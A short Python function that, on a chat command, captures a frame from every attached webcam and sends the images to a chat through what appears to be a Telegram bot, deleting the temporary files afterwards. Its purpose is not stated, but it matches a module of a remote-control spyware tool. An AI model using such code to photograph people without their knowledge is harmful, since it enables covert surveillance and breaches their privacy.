import cv2
import os

def take_photo(bot, message):
    try:
        cameras = []
        for i in range(4):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append(cap)
            else:
                break
        for cap in cameras:
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(f"temp_photo_{cameras.index(cap)}.jpg", frame)
                with open(f"temp_photo_{cameras.index(cap)}.jpg", "rb") as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(f"temp_photo_{cameras.index(cap)}.jpg")
        for cap in cameras:
            cap.release()

    except Exception as e:
        bot.reply_to(message, f"Hata: {str(e)}")